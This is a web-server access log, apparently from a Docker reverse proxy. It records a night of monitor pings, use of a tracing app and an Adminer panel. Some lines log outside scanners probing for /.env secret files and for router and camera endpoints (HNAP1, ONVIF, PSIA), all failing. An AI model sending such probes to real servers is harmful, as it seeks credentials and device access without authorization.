94.102.61.75 - - [15/Dec/2023:01:06:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4179 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:01:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4180 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4181 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4182 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4183 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4184 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4185 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:01:09:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4186 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:01:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4187 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4188 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4189 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4190 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4191 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4192 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:09 +0000] "GET /trace/start.php?id=oqbcx0e6x HTTP/2.0" 200 101 "-" "-" 4193 "livetrace@docker" "http://172.25.0.5:80" 34ms
4.26.29.194 - - [15/Dec/2023:01:12:16 +0000] "GET /trace/index.php HTTP/2.0" 200 751 "-" "-" 4194 "livetrace@docker" "http://172.25.0.5:80" 5007ms
4.26.29.194 - - [15/Dec/2023:01:12:22 +0000] "GET /trace/styles.css HTTP/2.0" 200 629 "-" "-" 4195 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:12:22 +0000] "GET /trace/script.js HTTP/2.0" 200 1174 "-" "-" 4196 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:23 +0000] "GET /trace/start.php?id=h3g3yz8c0 HTTP/2.0" 200 101 "-" "-" 4197 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:01:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4198 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:12:24 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 223 "-" "-" 4199 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:28 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 439 "-" "-" 4200 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:30 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 583 "-" "-" 4201 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:31 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 655 "-" "-" 4202 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:32 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 727 "-" "-" 4203 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:12:33 +0000] "GET /trace/poll.php?id=h3g3yz8c0 HTTP/2.0" 200 1024 "-" "-" 4204 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [15/Dec/2023:01:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4205 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:13 +0000] "GET /trace/index.php HTTP/2.0" 200 751 "-" "-" 4206 "livetrace@docker" "http://172.25.0.5:80" 8ms
4.26.29.194 - - [15/Dec/2023:01:13:13 +0000] "GET /trace/start.php?id=3wm9nv2el HTTP/2.0" 200 101 "-" "-" 4207 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:01:13:14 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 223 "-" "-" 4208 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:15 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 295 "-" "-" 4209 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:16 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 367 "-" "-" 4210 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:17 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 439 "-" "-" 4211 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:13:18 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 511 "-" "-" 4212 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:20 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 583 "-" "-" 4213 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:13:21 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 655 "-" "-" 4214 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:13:22 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 727 "-" "-" 4215 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:13:23 +0000] "GET /trace/poll.php?id=3wm9nv2el HTTP/2.0" 200 1024 "-" "-" 4216 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:01:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4217 "www@docker" "http://172.25.0.8:80" 1ms
185.236.231.187 - - [15/Dec/2023:01:13:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4218 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [15/Dec/2023:01:13:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4219 "web-to-websecure@internal" "-" 0ms
185.236.231.187 - - [15/Dec/2023:01:13:31 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4220 "-" "-" 0ms
185.236.231.187 - - [15/Dec/2023:01:13:31 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 4221 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:01:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4222 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4223 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4224 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4225 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4226 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4227 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4228 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4229 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4230 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4231 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4232 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4233 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4234 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4235 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4236 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4237 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4238 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4239 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4240 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4241 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4242 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4243 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4244 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4245 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4246 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4247 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4248 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4249 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4250 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4251 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4252 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4253 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4254 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4255 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4256 "www@docker" "http://172.25.0.8:80" 1ms
139.59.181.152 - - [15/Dec/2023:01:30:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4257 "web-to-websecure@internal" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:30:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4258 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:30:54 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 4259 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:01:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4260 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4261 "www@docker" "http://172.25.0.8:80" 1ms
139.59.181.152 - - [15/Dec/2023:01:31:47 +0000] "GET /HNAP1 HTTP/1.1" 404 19 "-" "-" 4262 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:31:47 +0000] "GET /HNAP1 HTTP/1.1" 301 17 "-" "-" 4263 "web-to-websecure@internal" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:31:48 +0000] "GET /HNAP1 HTTP/1.1" 404 19 "-" "-" 4264 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:06 +0000] "POST /onvif/device_service HTTP/1.1" 404 19 "-" "-" 4265 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:06 +0000] "GET /PSIA/index HTTP/1.1" 404 19 "-" "-" 4266 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:07 +0000] "POST /onvif/device_service HTTP/1.1" 308 18 "-" "-" 4267 "web-to-websecure@internal" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:08 +0000] "POST /onvif/device_service HTTP/1.1" 404 19 "-" "-" 4268 "-" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:08 +0000] "GET /PSIA/index HTTP/1.1" 301 17 "-" "-" 4269 "web-to-websecure@internal" "-" 0ms
139.59.181.152 - - [15/Dec/2023:01:32:09 +0000] "GET /PSIA/index HTTP/1.1" 404 19 "-" "-" 4270 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:01:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4271 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4272 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4273 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4274 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4275 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4276 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4277 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4278 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4279 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4280 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4281 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4282 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4283 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4284 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4285 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4286 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4287 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4288 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4289 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4290 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4291 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4292 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4293 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4294 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4295 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4296 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4297 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4298 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4299 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4300 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4301 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4302 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4303 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4304 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4306 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:49:19 +0000] "GET /trace/ HTTP/2.0" 200 751 "-" "-" 4305 "livetrace@docker" "http://172.25.0.5:80" 5007ms
4.26.29.194 - - [15/Dec/2023:01:49:24 +0000] "GET /trace/styles.css HTTP/2.0" 499 21 "-" "-" 4307 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:49:24 +0000] "GET /trace/start.php?id=fpe2r4asr HTTP/2.0" 200 101 "-" "-" 4308 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:01:49:25 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 223 "-" "-" 4309 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:49:26 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 295 "-" "-" 4310 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:27 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 367 "-" "-" 4311 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:28 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 439 "-" "-" 4312 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:29 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 511 "-" "-" 4313 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:49:30 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 583 "-" "-" 4314 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:31 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 655 "-" "-" 4315 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:32 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 727 "-" "-" 4316 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:33 +0000] "GET /trace/poll.php?id=fpe2r4asr HTTP/2.0" 200 1024 "-" "-" 4317 "livetrace@docker" "http://172.25.0.5:80" 2ms
78.153.140.221 - - [15/Dec/2023:01:49:33 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4318 "web-to-websecure@internal" "-" 0ms
78.153.140.221 - - [15/Dec/2023:01:49:34 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4319 "-" "-" 0ms
78.153.140.221 - - [15/Dec/2023:01:49:34 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4320 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:01:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4321 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:49:39 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4322 "livetrace@docker" "http://172.25.0.5:80" 6ms
4.26.29.194 - - [15/Dec/2023:01:49:39 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4323 "www@docker" "http://172.25.0.8:80" 35ms
4.26.29.194 - - [15/Dec/2023:01:49:39 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 4324 "www@docker" "http://172.25.0.8:80" 35ms
4.26.29.194 - - [15/Dec/2023:01:50:00 +0000] "GET //trace HTTP/2.0" 404 153 "-" "-" 4325 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:50:09 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4326 "livetrace@docker" "http://172.25.0.5:80" 8ms
4.26.29.194 - - [15/Dec/2023:01:50:09 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4327 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4328 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4329 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4330 "www@docker" "http://172.25.0.8:80" 31ms
4.26.29.194 - - [15/Dec/2023:01:51:35 +0000] "GET /trace HTTP/2.0" 404 146 "-" "-" 4331 "livetrace@docker" "http://172.25.0.5:80" 14ms
167.71.120.76 - - [15/Dec/2023:01:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4332 "www@docker" "http://172.25.0.8:80" 12ms
4.26.29.194 - - [15/Dec/2023:01:51:44 +0000] "GET /trace/ HTTP/2.0" 404 146 "-" "-" 4333 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:51:48 +0000] "GET /trace// HTTP/2.0" 404 146 "-" "-" 4334 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:51:52 +0000] "GET /trace HTTP/2.0" 404 146 "-" "-" 4335 "livetrace@docker" "http://172.25.0.5:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4336 "www@docker" "http://172.25.0.8:80" 19ms
167.71.120.76 - - [15/Dec/2023:01:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4337 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:52:51 +0000] "GET /trace HTTP/2.0" 404 146 "-" "-" 4338 "livetrace@docker" "http://172.25.0.5:80" 15ms
4.26.29.194 - - [15/Dec/2023:01:52:57 +0000] "GET /trace/ HTTP/2.0" 200 751 "-" "-" 4339 "livetrace@docker" "http://172.25.0.5:80" 6ms
4.26.29.194 - - [15/Dec/2023:01:52:57 +0000] "GET /trace/start.php?id=6xp340gk2 HTTP/2.0" 200 101 "-" "-" 4340 "livetrace@docker" "http://172.25.0.5:80" 4ms
4.26.29.194 - - [15/Dec/2023:01:52:58 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 223 "-" "-" 4341 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:52:59 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 295 "-" "-" 4342 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:00 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 367 "-" "-" 4343 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:01 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 439 "-" "-" 4344 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:02 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 511 "-" "-" 4345 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:03 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 583 "-" "-" 4346 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:53:04 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 655 "-" "-" 4347 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:05 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 727 "-" "-" 4348 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:53:06 +0000] "GET /trace/poll.php?id=6xp340gk2 HTTP/2.0" 200 1024 "-" "-" 4349 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:11 +0000] "GET /adminer HTTP/2.0" 200 4526 "-" "-" 4350 "adminer@docker" "http://172.25.0.10:8080" 94ms
